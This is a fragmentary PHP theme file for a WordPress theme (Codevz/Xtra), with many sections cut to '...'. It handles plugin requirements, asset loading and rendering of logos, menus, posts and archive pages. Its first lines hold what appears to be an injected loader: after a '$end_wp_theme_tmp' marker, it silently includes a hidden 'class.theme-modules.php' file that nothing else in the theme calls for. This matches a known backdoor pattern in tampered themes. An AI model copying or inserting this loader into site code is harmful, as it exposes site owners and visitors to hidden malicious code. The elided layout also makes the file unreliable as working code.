...
//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) {exit;} // Cannot access pages directly.
...
class Codevz_Theme {
	...
	public function __construct() {
		...
		update_option( 'codevz_theme_activation', 1 );
	}
	...
	public static function plugins() {
		...
		//$activated = is_array( get_option( 'codevz_theme_activation' ) ) ? 1 : 0;

		tgmpa([
			[
				'name' 				=> esc_html__( 'Codevz Plus', 'xtra' ),
				'slug' 				=> 'codevz-plus',
				'source' 			=> get_template_directory_uri() . '/inc/plugins/codevz-plus.zip',
				'required' 			=> true
			],
			[
	...
	public static function load_assets() {
		if ( ! isset( $_POST['vc_inline'] ) ) {
			...
			// Styles
			wp_enqueue_style( 'xtra-style', get_stylesheet_uri(), false, $ver );
			wp_enqueue_style( 'font-awesome', $uri . 'assets/icons/font-awesome.min.css', [], '4.7.1' );

			// JS
			wp_enqueue_script( 'xtra-custom', $uri . 'assets/js/custom.js', [ 'jquery' ], $ver, true );
	...
	public static function load_dynamic_css() {
		if ( ! isset( $_POST['vc_inline'] ) ) {
			...
			// Custom styles
			$handle = wp_style_is( 'codevz-plugin' ) ? 'codevz-plugin' : 'xtra-style';
			$extra_css = '';
		...
		if ( $prevPost || $nextPost ) { ?>
			<ul class="next_prev clr">
				...
				<?php } 
					...
					$archive_icon = self::option( 'next_prev_archive_icon' );
					if ( $archive_icon ) {
				?>
	...
	public static function get_row_element( $i, $m = [] ) {
		...
		if ( $elm === 'logo' || $elm === 'logo_2' ) {
			...
			if ( $logo ) {
				echo '<div class="logo_is_img ' . esc_attr( $elm ) . '"><a href="' . esc_url( home_url( '/' ) ) . '" title="' . esc_html( get_bloginfo( 'description' ) ) . '"><img src="' . esc_url( do_shortcode( $logo ) ) . '" alt="' . esc_attr( get_bloginfo( 'name' ) ) . '" width="200" height="200"' . ( empty( $i[ $elm . '_width' ] ) ? '' : ' style="width: ' . esc_attr( $i[ $elm . '_width' ] ) . '"' ) . '></a>';
			} else {
			...
			if ( $link ) {
				echo '<a class="elm_h_image" href="' . esc_url( $link ) . '"><img src="' . esc_url( do_shortcode( $i['image'] ) ) . '" alt="image" style="width:' . esc_attr( $width ) . '" width="' . esc_attr( $width ) . '" height="auto" /></a>';
			} else {
			...
			if ( $link ) {
				echo '<a class="elm_icon_text" href="' . esc_url( $link ) . '"' . $target . $hover_css . '>';
			} else {
			...
			if ( $link ) {
				echo '<a class="cz_elm_info_box" href="' . esc_url( $link ) . '" style="' . $wrap_style . '"' . $wrap_hover . '>';
			} else {
			...
			echo '<div class="offcanvas_container"><i class="' . esc_attr( $icon . ' ' . $elm_uniqid ) . '" data-cz-style="' . esc_attr( $icon_style ) . '">' . esc_html( $menu_title ) . '</i><div class="offcanvas_area offcanvas_original ' . ( empty( $i['inview_position_widget'] ) ? 'inview_left' : esc_attr( $i['inview_position_widget'] ) ) . '" style="' . esc_attr( $con_style ) . '">';
	...
	public static function generate_page( $page = '' ) {
		...
		if ( $is_404 ) {
			$custom_404 = self::get_page_as_element( $current_id );
			if ( $custom_404 ) {
				echo do_shortcode( $custom_404 );
			} else {
				echo '<h2 style="text-align:center;font-size:160px">404<small style="font-size: 32px">' . do_shortcode( self::option( '404_msg', 'How did you get here?! It’s cool. We’ll help you out.' ) ) . '</small></h2>';
			...
			if ( have_posts() ) {
				...
				if ( ! $blank && ( $title === '1' || $title === '2' || $title === '8' ) ) {
					$small = '';
					if ( is_single() && empty( $wp_query->queried_object->taxonomy ) && isset( $single_meta['mbot'] ) ) {
						$small .= '<span class="cz_top_meta">';
						$small .= '<span class="cz_top_meta_i mr10"><i class="fa fa-edit mr4"></i>' . esc_html( do_shortcode( self::option( 'posted_by_translate_' . $single_meta_cpt, 'Posted by' ) ) ) . ' <a class="cz_post_author_name" href="' . esc_url( $author_url ) . '">' . ucwords( get_the_author() ) . '</a></span>';
						$small .= '<span class="cz_top_meta_i"><i class="fa fa-clock-o mr4"></i>' . esc_html( do_shortcode( self::option( 'on_translate_' . $single_meta_cpt, 'On' ) ) ) . ' <time class="cz_post_date" datetime="' . get_the_date( 'c' ) . '" itemprop="datePublished">' . esc_html( get_the_date( get_option( 'date_format' ) ) ) . '</time></span>';
						$small .= '</span>';
					}
					echo '<h1 class="section_title">' . get_the_title() . wp_kses_post( $small ) . '</h1>';
				}
					...
					if ( ! empty( $meta['post_format'] ) ) {
						...
						if ( $meta['post_format'] === 'gallery' && ! empty( $meta['gallery_layout'] ) ) {
							...
							if ( $video_type === 'url' ) {
								...
								$video_url = isset( $meta['video_url'] ) ? $meta['video_url'] : '';
						...
						// Echo post format
						if ( $post_format_out ) {
							$post_format_out = '<div class="cz_single_post_format mb50">' . $post_format_out . '</div>';
						}
				...
				if ( $page === 'single' && empty( $wp_query->queried_object->taxonomy ) ) {
					...
					if ( isset( $single_meta['date'] ) || isset( $single_meta['author'] ) ) {
						...
						echo isset( $single_meta['date'] ) ? '<span class="cz_post_date"><time datetime="' . get_the_date( 'c' ) . '" itemprop="datePublished">' . esc_html( get_the_date( get_option( 'date_format' ) ) ) . '</time></span>' : '';
						echo '</span></span>';
					}
					...
					echo do_action( 'xtra_share' ); // Share icons.
					...
					if ( isset( $single_meta['author_box'] ) && self::author_box() ) {
						...
						echo '<h4>' . esc_html( ucfirst( get_the_author_meta('display_name') ) ) . '<small class="righter cz_view_author_posts"><a href="' . esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ) . '">' .  esc_html__( 'Author posts', 'xtra' ) . ' <i class="fa fa-angle-double-right ml4"></i></a></small></h4>';
		...
		// Archive posts
			...
			if ( $archive_desc ) {
				echo do_shortcode( wp_kses_post( $archive_desc ) );
			}

			// Action fire before archive content.
			echo do_action( 'xtra_before_archive_content' );
			...
			if ( $template === 'x' && $custom_template && $custom_template !== 'none' ) {
				...
				while ( have_posts() ) {
					...
					if ( $chess ) {
						...
						echo '<span class="cz_post_date"><time datetime="' . get_the_date( 'c' ) . '" itemprop="datePublished">' . esc_html( get_the_date( get_option( 'date_format' ) ) ) . '</time></span>';
						echo '</span></span>';
			...
			// Action fire after archive content.
			echo do_action( 'xtra_after_archive_content' );
